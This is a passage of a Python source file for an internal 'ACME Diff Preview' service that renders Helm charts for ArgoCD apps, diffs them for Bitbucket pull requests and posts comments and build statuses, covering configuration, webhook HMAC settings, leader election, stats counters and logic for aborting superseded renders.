#!/usr/bin/env python3
"""ACME Diff Preview - dynamic discovery, robust error handling, SHA dedup.

All apps are multi-source: source-1 = acme-config-dev, source-2 = Helm OCI.

Diff strategy: pure helm template (no ArgoCD agent calls during diff).
At startup, `argocd app list` is called once (cached 5 min) to discover chart
metadata (name, version, registry, value files, namespace). The diff itself uses:
  1. `helm pull oci://registry/chart --version X --untar` (cached locally)
  2. Bitbucket API to fetch value files at PR sha and main sha
  3. `helm template` to render both, then Python YAML diff

This is entirely local — no argocd app diff, no argocd app manifests, no spoke
agents. Typical latency: 4-6s/app with warm chart cache vs 20-360s with ArgoCD.

When the PR bumps appspace.version (= the OCI chart targetRevision), the new
version is detected from the PR config file via Bitbucket API and used for the
PR render while main render uses the current stored targetRevision.

Diff outcome model:
- diff          : a real manifest diff was produced (helm renders differ)
- no_diff       : the rendered manifests match (or only noise/checksum changes)
- indeterminate : the diff could NOT be computed. With the helm-template engine
                  the only causes are: OCI chart pull/login failure, the chart
                  version missing in the registry (oci_not_found), a value-file
                  fetch issue, a failed local render, or a timeout. This is NOT
                  "no changes" and must never be shown as a green check.
- error         : reserved for unexpected per-PR exceptions (see process_pr).

Failure reasons (REASON_* codes set directly by _run_one_diff, no stderr regex):
- oci_not_found  : version absent in the registry. PERMANENT -> FAILED build status
                   (the deployer would fail the same way), no retry, PR marked seen.
- oci_pull_failed: transient pull/login failure -> retried with backoff.
- metadata_pending: app not yet in the 5-min discovery cache -> retried.
- render_failed  : `helm template` failed (bad values/chart) -> soft indeterminate.
- timeout        : a step exceeded DIFF_TIMEOUT -> retried.
All non-permanent reasons end as indeterminate (never a hard error that fails a
PR on a transient blip) and are left un-seen so the next loop re-evaluates them.

Error handling:
- argocd app list failure: FAILED on all open main-targeting PRs, clean exit
- Bitbucket API 429/5xx/network: retried with backoff; transient misses are
  never cached as "missing" so they do not poison other apps
- diff timeout (DIFF_TIMEOUT): caught per-app, retried, then indeterminate
- large comment (>245KB): truncated with note, still posted
- upsert_comment failure: fallback minimal note attempted
- any per-PR exception: FAILED status + error comment, other PRs continue
- 0 apps affected: SUCCESSFUL posted so merge gates don't block non-infra PRs

SHA dedup:
- In-memory: skips same PR SHA within this pod's loop iterations
- Cross-pod: compares comment SHA; skips and fixes stuck INPROGRESS if needed
"""
import json, os, posixpath, random, re, shutil, signal, socket, ssl, sys, subprocess, time, threading, urllib.error, urllib.parse, urllib.request
import hashlib
import yaml  # PyYAML (requirements.txt) - input root-cause panel only, v2.6.2
import diff_ui  # full-diff web UI (same-dir module, stdlib only)
import leader  # Lease-based leader election (same-dir module, stdlib only)
import io as _io
import http.client as _http_client
import socketserver
import dataclasses
from collections import Counter, namedtuple
from dataclasses import dataclass
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

def _env_int(name: str, default: int) -> int:
    """Parse an integer env var, falling back to default on any bad value.

    A typo in ANY numeric env var (e.g. DIFF_WORKERS=sixteen) used to crash
    the pod at import time with a raw traceback and no hint which variable
    was at fault (bughunt N3). Now it logs a WARNING naming the variable,
    the bad value, and the default used, and the pod starts normally.
    """
    raw = os.environ.get(name)
    if raw is None:
        return default
    try:
        return int(raw)
    except ValueError:
        print(f'WARNING: env var {name}="{raw}" is not a valid integer; '
              f'using default {default}', file=sys.stderr, flush=True)
        return default


# Running version, injected at image build (docker.yml passes the git tag as
# the APP_VERSION build-arg -> ENV). Falls back to "dev" for local runs.
# v2.5.19 (F1): before this, nothing in the pod told you what version was
# actually running — the "always verify the live pod image" release step was
# a manual kubectl exercise. Now it is logged at startup and exposed in /stats.
APP_VERSION = os.environ.get("APP_VERSION", "dev")


def _require_env(*names):
    """Exit with ONE clear message listing every missing required env var.

    v2.5.19 (F2): the bare os.environ["X"] reads below fail-fast correctly but
    greet a misconfigured deployment with a raw KeyError for a single var at a
    time — fix one, redeploy, hit the next. This reports them all at once.
    Returns None when all are present (also used by tests).
    """
    missing = [n for n in names if not os.environ.get(n)]
    if missing:
        msg = ("FATAL: missing required environment variable(s): "
               + ", ".join(missing))
        print(msg, file=sys.stderr, flush=True)
        raise SystemExit(msg)
    return None


# Validate everything up front so a misconfigured deployment fails with one
# actionable message instead of a KeyError cascade.
_require_env("BB_USER", "BB_TOKEN", "ARGOCD_PASS")

BB_WORKSPACE       = "appspace-cloud"

# ── Multi-repo support (COPS-2507) ──────────────────────────────────────────
# DIFF_REPOS: semicolon-separated repo entries, each "slug" or "slug:scopes"
# where scopes is a |-separated list of path prefixes the service should
# consider inside that repo (files outside every scope are invisible to
# affected-app matching AND new-env detection). An entry with no scopes
# means "whole repo" — every ArgoCD app in that repo is reachable, and any
# tree the repo has that ArgoCD does NOT manage (e.g. a legacy-pipeline
# path) is simply never matched by any app, so it stays silent on its own
# without needing an explicit scope exclusion. Production runs both
# acme-config-dev and acme-config-stage with no scope restriction (stage
# gained azure/ coverage in v2.6.3, when pv-stage-corporate-b was onboarded
# to ArgoCD as the first Azure spoke). Scopes remain available for a repo
# that genuinely wants to exclude an in-repo tree the service should never
# look at, regardless of whether ArgoCD apps exist there.
#   DIFF_REPOS="acme-config-dev;acme-config-stage"
#   DIFF_REPOS="acme-config-dev;acme-config-stage:gcp/|azure/"   (scoped form, still supported)
# Default preserves the exact single-repo behavior this service always had.
def _parse_diff_repos(raw: str) -> dict:
    repos: dict = {}
    for entry in raw.split(";"):
        entry = entry.strip()
        if not entry:
            continue
        slug, _, scope_raw = entry.partition(":")
        slug = slug.strip()
        if not slug:
            continue
        scopes = [s.strip() for s in scope_raw.split("|") if s.strip()]
        repos[slug] = {"scopes": scopes}
    if not repos:
        repos["acme-config-dev"] = {"scopes": []}
    return repos

REPOS: dict = _parse_diff_repos(os.environ.get("DIFF_REPOS", "acme-config-dev"))
# Transitional alias: single-repo code paths not yet repo-parameterized keep
# working during the refactor; by the end of it, BB_REPO remains only as the
# default argument for backwards-compatible call sites (tests, tools).
BB_REPO            = next(iter(REPOS))
BB_USER            = os.environ["BB_USER"]
BB_TOKEN           = os.environ["BB_TOKEN"]
# Pre-encoded Basic auth header value computed once at startup.
# Avoids repeated base64 encoding on every Bitbucket API call.
import base64 as _base64
_BB_AUTH_HEADER    = "Basic " + _base64.b64encode(
    f"{os.environ['BB_USER']}:{os.environ['BB_TOKEN']}".encode()).decode()
ARGOCD_SERVER      = "argocd.appspace.com"
ARGOCD_BIN         = os.environ.get("ARGOCD_BIN", "/usr/local/bin/argocd")
# Configurable via environment variables — set via ExternalSecret.
ARGOCD_USER          = os.environ.get("ARGOCD_USER", "diff-preview")
ARGOCD_PASS          = os.environ["ARGOCD_PASS"]
# Comma-separated list of ArgoCD projects the webhook hard-refresh targets.
ARGOCD_PROJECTS      = os.environ.get("ARGOCD_PROJECTS", "appspace-dev,appspace-qa").split(",")
# HMAC-SHA256 key for verifying incoming JFrog webhook requests.
# HMAC-SHA256 secret for verifying incoming Bitbucket PR webhook requests.
# Bitbucket signs the payload with X-Hub-Signature: sha256=<hex>.
# When set, any request without a valid signature is rejected with 401.
# When empty (default), webhooks are accepted without verification for
# backward compatibility during rollout; set the secret once Bitbucket
# is configured with the same value.
BB_WEBHOOK_SECRET    = os.environ.get("BB_WEBHOOK_SECRET", "")
JFROG_WEBHOOK_SECRET = os.environ.get("JFROG_WEBHOOK_SECRET", "")
# Deduplication window: skip hard-refresh if same chart:version was processed
# within this many seconds. Handles JFrog retries and rapid successive pushes.
JFROG_DEDUP_WINDOW   = _env_int("JFROG_DEDUP_WINDOW", 15)
# Human-readable name shown on the Bitbucket PR build status and comment header.
STATUS_NAME        = "ACME Diff Preview"
# Marker written into the footer of every comment we post. find_existing_comment
# also matches the legacy "argocd-diff-preview" marker so comments created by
# older pods are still updated in place (no duplicate comment) during rollout.
COMMENT_MARKER     = "acme-diff-preview"
_COMMENT_MARKERS   = ("acme-diff-preview", "argocd-diff-preview")


def _extract_comment_sha(raw: str) -> str:
    """Pull the 8-char PR sha out of a previously-posted comment's header.

    BUG FIX: the header is written as "**Commit** `{sha}`" (bold markdown,
    space before the backtick). The regex used to read it back was
    r'Commit `([0-9a-f]{8})`' -- missing the "**" and the space -- so it
    NEVER matched any comment this bot ever posted, in any version since
    the header format was introduced. Every call returned "". That made
    the cross-pod sha-dedup check (`comment_sha == pr_sha[:8]`) permanently
    false, so a pod restart caused a full, unnecessary re-diff of every
    currently open PR even when the posted comment already covered the
    exact same commit. Confirmed empirically against real format_comment()
    output before fixing; regression test constructs a REAL comment via
    format_comment rather than a hand-typed string, so this class of
    generated-vs-parsed drift cannot silently reappear.
    """
    m = re.search(r'\*\*Commit\*\*\s*`([0-9a-f]{8})`', raw)
    return m.group(1) if m else ""


def _extract_status_token(raw: str) -> str:
    """Pull the machine-readable clean/permanent/transient token out of a
    previously-posted comment's footer.

    BUG FIX: the footer is written as "{COMMENT_MARKER} [{token}]" (an
    em-dash and a space precede the marker, never a literal '['). The
    regex used to read it back required a literal bracket before the marker --
    requiring a literal '[' immediately before the marker -- so it NEVER
    matched, in any version since the token was introduced (comment
    itself said "1.9.1+"). Every call silently fell back to matching
    human-readable substrings, which happened to reproduce the intended
    behavior for "clean" and error/transient cases but not for "permanent"
    errors (oci_not_found's status text also contains "Diff incomplete",
    the substring used to detect *transient* problems) -- so a permanent,
    unfixable error was retried forever instead of being left alone, and
    in the pod-crash recovery path (fix_stuck_inprogress) a stuck-INPROGRESS
    PR with a permanent error could be resolved to a false "SUCCESSFUL"
    Bitbucket status instead of "FAILED". Confirmed empirically against
    real format_comment() output across all 5 outcome scenarios before
    fixing (clean, clean-with-diff, permanent, transient, error).
    """
    m = re.search(re.escape(COMMENT_MARKER) + r'\s+\[(clean|permanent|transient)\]', raw)
    return m.group(1) if m else ""
# BUILD_KEY is the STABLE Bitbucket build-status key. It MUST NOT change: the
# key identifies the status row, so renaming it would leave the old status
# orphaned and create a second row on every existing PR. Only STATUS_NAME (the
# display label) changes for the rename.
BUILD_KEY          = "argocd-diff-preview"
# Verbose per-app / full-stderr logging. Set LOG_LEVEL=DEBUG to enable.
LOG_LEVEL          = os.environ.get("LOG_LEVEL", "INFO").upper()
DEBUG              = LOG_LEVEL == "DEBUG"
MAX_RESOURCES_FULL = 5       # resources shown with full diff block
MAX_DIFF_CHARS     = 2000    # chars per resource diff block
# COPS-2567: slots inside the display budget kept for the risk sections we
# already detect (deletions first, then replicas zeroed). Sections are sorted
# by resource key, so an alphabetically late kind (HorizontalPodAutoscaler,
# PodDisruptionBudget, Secret, ServiceAccount, VerticalPodAutoscaler) used to
# be pushed out of the body by ordinary Deployment changes. Half of
# AI_MAX_SECTIONS_PER_APP (10), kept as a literal because that constant is
# defined further down this module.
RISK_SECTION_RESERVE = 5
DISPLAY_BODY_MAX_CHARS = 6000  # v2.5.8: hard cap per resource body in the PR
                               # comment, WITH an explicit marker (protects
                               # the footer/status token from the blunt
                               # MAX_COMMENT_BYTES global cut)
# Capacity knobs (env-overridable). Defaults sized for a single PR that diffs
# hundreds of apps (a chart version bump rolled out to many clusters at once).
# The diff is a pure local `helm template` render (no ArgoCD agent round-trips),
# so the client can fan out wide: the only shared limit is the Bitbucket API
# (BB_API_CONCURRENCY) used to fetch value files.
MAX_APPS_PER_RUN   = _env_int("MAX_APPS_PER_RUN", 1500)  # ~1.7x the largest fleet (see README)
DIFF_WORKERS       = _env_int("DIFF_WORKERS", 16)        # parallel per-app helm-template diffs
DIFF_TIMEOUT       = _env_int("DIFF_TIMEOUT", 120)       # seconds per diff (OCI cache-miss pulls are slow)
WARM_WORKERS       = _env_int("WARM_WORKERS", 4)         # parallel chart-cache warm-up pulls
WARM_THRESHOLD     = _env_int("WARM_THRESHOLD", 8)       # only warm when a PR fans out to more apps than this
MAX_COMMENT_BYTES  = 245_000 # Bitbucket ~256KB limit; leave headroom
# Proactive readability budget, far below the Bitbucket hard limit.
# Reality check on acme-config-prod (2026-08): 8 of the 14 most recent bot
# comments sat EXACTLY at the 245KB truncation wall — one of them a routine
# fleet-wide version bump (PR #3891) rendering 473 diff blocks. Meanwhile
# every committed "readable" golden comment is under 4KB. Nobody reads
# 150KB in a PR comment; the full-diff view exists for that. 30KB is ~8x
# the largest small-PR comment today and a few screen-scrolls at most.
# Critical panels (state flags, cause panel, decommission, VM changes,
# downgrades, deletions, renames) always render in full; only ordinary
# per-app diff blocks past this budget collapse into a pointer at the
# full-diff view. Env-overridable like the other capacity knobs.
COMMENT_READABLE_BYTES = _env_int("COMMENT_READABLE_BYTES", 30_000)
# Overview-table row cap, applied only when the changeset is already past
# the readability budget: a 774-row overview table (observed live on
# acme-config-prod PR #3890) is pure scroll with no glance value.
_OVERVIEW_TABLE_MAX_ROWS = 40
JFROG_MAX_BODY_BYTES = _env_int("JFROG_MAX_BODY_BYTES", 65536)  # 64 KB — reject oversized bodies before HMAC

# ── Full-diff web UI (Atlantis-style) ────────────────────────────
# The PR comment stays the summary (truncated over MAX_COMMENT_BYTES); with
# this enabled the COMPLETE body is persisted per (repo, pr, sha) and served
# at /diff/<repo>/<pr>/<sha> on the same health server, and the Bitbucket
# build status deep-links there. Default ON, and verified safe to default
# on: the ArgoCD hub Ingress extraPaths only forward two specific paths to
# this Service (/jfrog-webhook, /diff-preview/webhook), never a wildcard, so
# turning this on does not expose /diff/* anywhere it was not already
# reachable (in-cluster traffic or kubectl port-forward only). Reaching it
# from outside the cluster over a real hostname, behind Google IAP, is a
# SEPARATE opt-in: see the diffUi.ingress chart value (default off, it needs
# a real IAP OAuth client provisioned in the GCP project first).
# DIFF_UI_BASE_URL is that externally reachable base; while empty, artifacts
# are still saved and served in-cluster but the build status keeps linking
# to the comment, exactly as before this feature existed.
DIFF_UI_ENABLED       = os.environ.get("DIFF_UI_ENABLED", "true").strip().lower() in ("1", "true", "yes")
DIFF_UI_DIR           = os.environ.get("DIFF_UI_DIR", "/tmp/acme-diff-ui")
DIFF_UI_BASE_URL      = os.environ.get("DIFF_UI_BASE_URL", "").rstrip("/")
DIFF_UI_MAX_ARTIFACTS = _env_int("DIFF_UI_MAX_ARTIFACTS", 500)
# Byte budget for the local artifact cache (COPS-2610). The count cap above
# is measured in the wrong unit for how this directory actually fails: it is
# a 1Gi emptyDir whose sizeLimit the kubelet enforces by EVICTING the pod,
# and artifact sizes span three orders of magnitude (median ~181KB, observed
# worst 26.7MB before the page was uncapped). 400MiB leaves the rest of the
# emptyDir to everything else that writes under /tmp. Cheap to be strict:
# GCS is the durable copy, a pruned entry costs one re-download.
DIFF_UI_MAX_BYTES     = _env_int("DIFF_UI_MAX_BYTES", 400 * 1024 * 1024)
# Escape hatch for the uncapped full-diff page (COPS-2610): false restores
# the pre-2.33.0 page (bodies cut at DISPLAY_BODY_MAX_CHARS with a marker).
# ROLLBACK ORDER, once phase E (COPS-2612) is live: set
# COMMENT_INLINE_DIFFS=true FIRST, then flip this. The other order leaves
# the comment without YAML while the page truncates -- information is gone.
FULL_PAGE_UNCAPPED    = os.environ.get("FULL_PAGE_UNCAPPED", "true").strip().lower() in ("1", "true", "yes")
# ── Phase E switches (COPS-2612) ─────────────────────────────────────────
# The comment becomes a decision summary: verdicts, names and counts stay,
# the YAML evidence moves to the full-diff page. Safe only because phase C
# proved the page holds everything and retains it, and phase D made it
# navigable. Measured on the 36-PR corpus: median comment 9,874 bytes, of
# which 70-93% is YAML that the same reader can now open in one click.
#
# COMMENT_INLINE_DIFFS=true is the one-variable rollback to the old shape,
# and it is also the FIRST step when rolling back phase C -- see README.
# These are read at render time through RenderProfile.resolved(), never
# snapshotted at import, or the rollback would not work on a running pod.
COMMENT_INLINE_DIFFS  = os.environ.get("COMMENT_INLINE_DIFFS", "false").strip().lower() in ("1", "true", "yes")
COMMENT_INPUT_PANEL   = os.environ.get("COMMENT_INPUT_PANEL", "false").strip().lower() in ("1", "true", "yes")
# Narrow escape hatch: with inline diffs off, still show this many lines of
# evidence for BLOCK-severity findings only. 0 (default) means the comment
# ships with no fenced block at all.
COMMENT_INLINE_EVIDENCE_LINES = _env_int("COMMENT_INLINE_EVIDENCE_LINES", 0)
# Durable artifact store: name of a GCS bucket. Empty keeps the old
# behavior (local dir only, artifacts die with the pod). When set, saves
# are mirrored to the bucket and local read misses fall back to it, so
# permalinks survive restarts and any replica can serve any artifact.
DIFF_UI_GCS_BUCKET    = os.environ.get("DIFF_UI_GCS_BUCKET", "").strip()

# Soft GCS failures from the store surface in this process's JSON log.
# Late-bound on purpose: log() is defined further down and resolves at
# call time, not at assignment time.
diff_ui.on_warning = lambda msg: log(msg, "WARNING")

# Leader election (HA): with 2+ replicas, only the lease holder runs the
# poll loop; every replica keeps serving HTTP (diff UI, webhooks, probes).
# Env knobs (read by _make_leader_elector at startup, client-go defaults):
# LEADER_ELECTION_ENABLED, LEADER_LEASE_NAME, LEADER_LEASE_DURATION,
# LEADER_RENEW_DEADLINE, LEADER_RETRY_PERIOD. At replicas=1 the single pod
# trivially always wins, so this ships as a behavioral no-op.
#
# The election runs in its own daemon thread; main() wires this up. None
# means "no elector" (tests, direct function calls): act as a single
# instance, exactly the pre-HA behavior.
_leader = None


def _make_leader_elector():
    """Build the elector from env, read at call time so startup always sees
    the pod's real environment (and tests can vary it per case)."""
    enabled = os.environ.get(
        "LEADER_ELECTION_ENABLED", "true").strip().lower() in ("1", "true", "yes")
    return leader.LeaderElector(
        os.environ.get("LEADER_LEASE_NAME", "acme-diff-preview-leader").strip(),
        os.environ.get("HOSTNAME") or socket.gethostname(),
        lease_duration=_env_int("LEADER_LEASE_DURATION", 15),
        renew_deadline=_env_int("LEADER_RENEW_DEADLINE", 10),
        retry_period=float(_env_int("LEADER_RETRY_PERIOD", 2)),
        enabled=enabled,
        on_event=lambda msg: log(
            f"[leader] {msg}",
            "WARNING" if ("non-fatal" in msg or "failed" in msg) else "INFO"))


def _record_affected_apps(count: int) -> None:
    """Track the largest single-run app demand, before any cap truncation.

    Published next to the cap so remaining headroom is readable without
    digging through logs. It records the demand rather than the batch
    actually run: pegging it at the cap would hide precisely the overflow
    this exists to reveal.
    """
    with _diff_stats_lock:
        if count > _diff_stats.get("max_affected_apps_seen", 0):
            _diff_stats["max_affected_apps_seen"] = count
    if count > MAX_APPS_PER_RUN:
        log(f"app cap exceeded: {count} affected, cap {MAX_APPS_PER_RUN}, "
            f"{count - MAX_APPS_PER_RUN} not evaluated")
    elif count > MAX_APPS_PER_RUN * 0.9:
        log(f"app cap headroom low: {count} affected, cap {MAX_APPS_PER_RUN}")


def _should_run_iteration(elector) -> bool:
    """Pure gate: the poll loop belongs to the leader (or to a process with
    no elector wired, which is the single-instance mode)."""
    return elector is None or elector.is_leader()


def _forward_webhook_to_leader(body: bytes, headers) -> bool:
    """Relay a verified Bitbucket webhook from a standby to the leader pod.

    The load balancer delivers each webhook to ONE replica; when that
    replica is the standby, waking only itself would defer processing to
    the leader's 60s safety net. Instead the standby relays the EXACT
    original request (body and HMAC signature untouched, so the leader
    re-verifies it like any other webhook) straight to the leader pod's
    IP, with a marker header so a relay is never relayed again even if
    leadership flips mid-flight. Best-effort by design: any failure here
    just means falling back to the safety net, never a failed webhook.
    """
    holder = ""
    try:
        if _leader is None:
            return False
        holder = _leader.current_holder()
        if not holder or holder == (
                os.environ.get("HOSTNAME") or socket.gethostname()):
            return False
        ip = _leader.pod_ip(holder)
        req = urllib.request.Request(
            f"http://{ip}:8080/diff-preview/webhook", data=body,
            method="POST",
            headers={
                "X-Hub-Signature": headers.get("X-Hub-Signature", ""),
                "X-Event-Key": headers.get("X-Event-Key", ""),
                "X-ADP-Forwarded": "1",
                "Content-Type": "application/json",
            })
        with urllib.request.urlopen(req, timeout=3):
            pass
        return True
    except Exception as e:
        log(f"[leader] webhook relay to {holder or 'unknown leader'} failed "
            f"(non-fatal, safety net covers it): {e}", "WARNING")
        return False

# JFrog webhook dedup state: {chart:version -> last_processed_timestamp}
_jfrog_recent:     dict          = {}
_jfrog_dedup_lock: threading.Lock = threading.Lock()

# JFrog webhook counters — exposed at GET /jfrog-webhook/stats
_jfrog_stats:      dict          = {
    "received": 0,       # all POST requests reaching /jfrog-webhook
    "rejected_hmac": 0,  # HMAC verification failed
    "rejected_format": 0,# malformed payload or oversized body
    "dedup_skipped": 0,  # duplicate within JFROG_DEDUP_WINDOW
    "refreshes_ok": 0,   # individual app hard-refreshes succeeded
    "refreshes_failed": 0,# individual app hard-refreshes failed
    "started_at": None,  # ISO timestamp, set on first received request
}
_jfrog_stats_lock: threading.Lock = threading.Lock()

# COPS-2575: Bitbucket webhook counters, exposed under "bb_webhook" on
# GET /diff-preview/stats. The JFrog webhook has had counters since v2.5.x;
# the Bitbucket one had none, which is why nobody could tell at a glance
# whether webhooks were even arriving. The failure this catches is the one no
# unit test can: the hook deleted or disabled in Bitbucket, the URL changed,
# an ingress rule dropping the POST, or BB_WEBHOOK_SECRET drifting out of sync
# after a rotation. In all of those the code is perfectly correct and the
# service quietly degrades to the 60s safety-net tick.
_bb_webhook_stats:      dict          = {
    "received": 0,             # all POSTs reaching /diff-preview/webhook
    "rejected_hmac": 0,        # HMAC verification failed
    "rejected_format": 0,      # bad/oversized Content-Length, refused pre-read
    "wakes": 0,                # pullrequest:* events that woke the loop
    "hints_recorded": 0,       # payloads that yielded a usable supersede hint
    "supersedes_triggered": 0, # renders actually aborted as superseded
    "last_received_at": None,  # ISO timestamp of the most recent POST
}
_bb_webhook_stats_lock: threading.Lock = threading.Lock()

# Bounded worker pool for webhook-triggered hard refreshes. A CI republish
# burst (dozens of distinct chart versions in a minute) previously spawned
# one daemon thread per event — an uncapped thundering herd on the ArgoCD
# API (bughunt F3: 24 pushes -> 24 concurrent threads). Tasks now queue and
# drain at a controlled rate.
# Renamed from the overloaded JFROG_REFRESH_WORKERS (bughunt N1): that one
# name was read in two places with two different meanings and different
# defaults (4 here, 8 below) - lowering it to calm the ArgoCD API throttled
# both the event-dispatch pool AND the per-event app fan-out at once, with a
# confusing multiplicative effect. Now each has its own name and default.
JFROG_DISPATCH_WORKERS = _env_int("JFROG_DISPATCH_WORKERS", 4)
_jfrog_refresh_pool = ThreadPoolExecutor(
    max_workers=JFROG_DISPATCH_WORKERS, thread_name_prefix="jfrog-refresh-worker")

# Diff operation counters — exposed at GET /diff-preview/stats
_diff_stats:      dict          = {
    "prs_processed": 0,      # PRs where we ran at least one diff
    "apps_diff": 0,          # apps with real changes
    "apps_no_diff": 0,       # apps confirmed unchanged
    "apps_indeterminate": 0, # diffs that could not be computed
    "apps_oci_not_found": 0, # permanent OCI version missing
    "apps_render_failed": 0, # helm template failed (bad values/chart) — bughunt N4
    "apps_timeout": 0,       # a diff step exceeded DIFF_TIMEOUT — bughunt N4
    "main_render_cache_hits": 0,   # reused a parsed main-side render — bughunt N4
    "main_render_cache_misses": 0, # had to render main fresh — bughunt N4
    # v2.5.19 (M8): visibility into the v2.5.18 scale machinery — are these
    # paths firing in production, and how often?
    "comments_truncated": 0,       # comments that exceeded MAX_COMMENT_BYTES
    # COPS-2575: webhook-triggered vs safety-net-triggered iterations. If the
    # webhook silently dies, safety_net climbs and webhook flatlines.
    "iters_webhook_triggered": 0,
    "iters_safetynet_triggered": 0,
    # COPS-2576: a standby's loop passes, counted apart. Its 5s reactive
    # wait is a leadership-handoff poll, not the 60s safety net, so mixing
    # it into the pair above made the safety-net-to-webhook ratio useless
    # on a standby (it climbed ~12x faster and meant nothing).
    "iters_standby_wait": 0,
    "last_iteration_trigger": None,
    # COPS-2577: largest number of apps a single run was asked to evaluate.
    # The cap is a hard merge block once crossed (over-cap apps are not
    # evaluated, so the status is FAILED rather than a false green), which
    # means an undersized cap first shows up as a blocked production PR.
    # This is the demand before truncation, so the gap to MAX_APPS_PER_RUN
    # is the real remaining headroom.
    "max_affected_apps_seen": 0,
    "ai_prompt_capped": 0,         # AI prompts capped at AI_MAX_APPS
    # COPS-2609 (phase B): the shape of the comment we post. Phases C-E are
    # verified against these numbers, so they have to exist before those
    # phases move anything. comment_bytes is the last comment rendered;
    # comment_max_bytes is the high-water mark, which is the one that can
    # answer phase E's "no comment ever reaches MAX_COMMENT_BYTES": a
    # last-value gauge only ever describes whichever PR rendered last.
    "comment_bytes": 0,            # size of the most recent comment body
    "comment_max_bytes": 0,        # largest comment body rendered so far
    "comment_fences": 0,           # diff fences in the most recent comment
    # Comments posted with the hunks inlined because the full-diff page was
    # not available. Harmless today; from phase E on, every one of these is
    # a reviewer reading a comment that lost its backing page.
    "comment_fallback_inline": 0,
    # Times the storage cap trimmed an app's section list (COPS-2610). Every
    # increment is content missing from BOTH surfaces; after phase E, from
    # everywhere. Should stay 0 -- if it moves, raise
    # FULL_SECTIONS_MAX_PER_APP.
    "section_cap_trims": 0,
    "diff_retries": 0,             # per-diff transient retries performed
    "futures_cancelled": 0,        # subtask futures cancelled on abnormal exit
    # v2.5.20 (E1): HTTP connection-pool observability. reuses vs fresh
    # tells whether keep-alive is actually paying off in production;
    # fallbacks counts requests the pool could not serve (redirects,
    # double connection failures, non-HTTPS) and re-routed to urllib.
    "http_pool_reuses": 0,         # requests served on an existing connection
    "http_pool_fresh_conns": 0,    # new HTTPSConnections opened
    "http_pool_fallbacks": 0,      # requests re-routed to plain urlopen
    # v2.5.25 (post-403-incident L1/L2): OCI-path health, previously
    # invisible — a pod could be Ready with 100% of pulls failing.
    "oci_selfcheck": None,         # ok / failed / skipped — periodic helm show chart
    "oci_selfcheck_at": None,      # ISO timestamp of the last self-check
    "oci_consecutive_pull_failures": 0,  # systemic pull failures since last success
    "last_iteration_s": None,# seconds taken by most recent iteration
    "last_iteration_at": None,
}
_diff_stats_lock: threading.Lock = threading.Lock()

# Comment-ID cache: avoids re-paginating ALL comments on every iteration to
# find ours (bughunt N5). Our comment is updated in place, so its position
# among a PR's comments never moves; on a heavily-discussed PR the old
# lookup re-scanned every human comment every ~60s. Once found, a single
# GET by ID replaces the full page scan. Self-healing: a 404 (comment
# deleted) evicts the entry and falls back to a full scan once.
_comment_id_cache: dict      = {}
_comment_id_cache_lock       = threading.Lock()

# In-memory SHA dedup: avoids reprocessing same PR SHA within this pod run
_seen: dict    = {}
_shutdown: bool = False   # set True by SIGTERM handler
_ready: bool    = False   # set True after first successful argocd_login()
_wake           = threading.Event()  # set by POST /diff-preview/webhook
_seen_lock      = threading.Lock()   # guards _seen, _force_recompute and _pr_chart_targets
_force_recompute: set  = set()   # PR ids that must bypass dedup once (chart republished)
_pr_chart_targets: dict = {}     # pr_id -> {(chart, version), ...} builds each open PR renders with

# ── COPS-2575: supersede an in-flight render ──────────────────────────────────
# The webhook already carries which PR moved to which commit; before this it
# was parsed for nothing and only the X-Event-Key header was used. Without it,
# two pushes inside one render window made the first render run to completion
# against a dead commit and publish that result (acme-config-prod PR 3837:
# 190s wasted, and for ~10s a build status for one commit sat next to a
# comment describing another).
#
# Own lock on purpose: _seen_lock already guards three structures and is taken
# by the PR workers, whereas this dict is written from HTTP handler threads.
_pr_superseded: dict       = {}   # (repo, pr_id) -> newest sha seen from a webhook
_pr_supersede_aborts: dict = {}   # (repo, pr_id) -> consecutive aborts, livelock guard
# COPS-2617: the same idea for the DESTINATION branch. When main advances
# because a different PR merged, every open PR's snapshot is stale -- but
# that was only noticed AFTER a render finished, by comparing the [base:]
# token in the already-published comment, which costs a full re-render
# instead of an early abort. Measured on acme-config-prod: four merges in
# ~8 minutes produced 6 passes across two large PRs, of which 4 rendered
# against a base_sha already superseded, and #3922's comment (564 apps,
# ~4 min/pass) was rewritten 3 times purely from unrelated merges.
#
# Keyed by (repo, base_branch) rather than per PR: one merge invalidates
# every open PR against that branch, and a burst of merges must cost one
# extra pass in total, not one per merge. Most recent sha wins.
_base_superseded: dict     = {}   # (repo, base_branch) -> newest base sha
_supersede_lock            = threading.Lock()
# A PR pushed to faster than it can render would abort forever and never
# publish anything. After this many consecutive aborts, let the run finish.
SUPERSEDE_MAX_CONSECUTIVE_ABORTS = _env_int("SUPERSEDE_MAX_CONSECUTIVE_ABORTS", 3)
SUPERSEDE_ABORT_ENABLED = os.environ.get(
    "SUPERSEDE_ABORT_ENABLED", "true").strip().lower() in ("1", "true", "yes")
# Bitbucket sends 12-char short hashes in both the PR list API and the webhook
# payload, but normalise anyway so a future 40-char source cannot break the
# comparison in the silent direction (always superseded / never superseded).
_SHA_CMP_LEN = 12


def _sha_eq(a: str, b: str) -> bool:
    if not a or not b:
        return False
    return a[:_SHA_CMP_LEN] == b[:_SHA_CMP_LEN]


def _record_supersede_hint(repo: str, pr_id: int, sha: str) -> None:
    """Record that (repo, pr_id) has moved to `sha`. Called from the webhook
    handler thread. Never raises: the wake path must not depend on this."""
    if not SUPERSEDE_ABORT_ENABLED:
        return
    try:
        with _supersede_lock:
            _pr_superseded[(repo, pr_id)] = sha
        with _bb_webhook_stats_lock:
            _bb_webhook_stats["hints_recorded"] += 1
    except Exception:
        # Deliberately swallowed and deliberately silent. This runs on the
        # webhook thread, where _wake.set() has already happened, and the
        # hint is a pure optimisation: losing one only means the render is
        # not aborted early, which is exactly the pre-COPS-2575 behaviour.
        # Logging here would be worse than useless, since the only plausible
        # cause is memory pressure, and that is the moment you least want an
        # extra allocation on the wake path.
        pass


def _arm_supersede(sk, pr_sha: str):
    """Consume any pending hint for `sk` and report whether it supersedes.

    Atomic pop, deliberately NOT a blind clear. A webhook that lands while the
    PR is still queued behind others (MAX_PR_WORKERS=3, minutes on a busy
    iteration) writes its hint before this runs; clearing it would destroy the
    one signal that the snapshot is already stale, which is the exact bug
    being fixed. Popping means each hint is consumed exactly once, so a hint
    the current snapshot already reflects cannot abort a correct run either.

    Returns the newer sha, or None to proceed.
    """
    if not SUPERSEDE_ABORT_ENABLED:
        return None
